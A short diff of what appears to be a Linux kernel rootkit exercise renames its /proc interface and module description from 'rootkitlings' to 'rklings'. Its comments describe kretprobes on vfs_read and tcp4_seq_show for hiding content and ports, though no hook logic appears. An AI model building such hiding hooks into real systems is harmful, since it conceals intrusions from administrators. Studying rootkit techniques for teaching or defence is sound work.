@@ -84,7 +84,7 @@ static struct kretprobe tcp_probe = {
 	.maxactive = 8,
 };
 
-/* --- /proc/rootkitlings interface --- */
+/* --- /proc/rklings interface --- */
 
 static int rk_show(struct seq_file *out, void *unused)
 {
@@ -132,11 +132,11 @@ static const struct proc_ops rk_proc_ops = {
 // 1. Init both target lists
 // 2. Register the vfs_read kretprobe
 // 3. Register the tcp4_seq_show kretprobe
-// 4. Create /proc/rootkitlings
+// 4. Create /proc/rklings
 // Clean up in reverse on any failure.
 
 // TODO: Implement rk_exit().
 // Remove proc entry, unregister both probes.
 
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("Rootkitlings content and port hiding");
+MODULE_DESCRIPTION("Rklings content and port hiding");
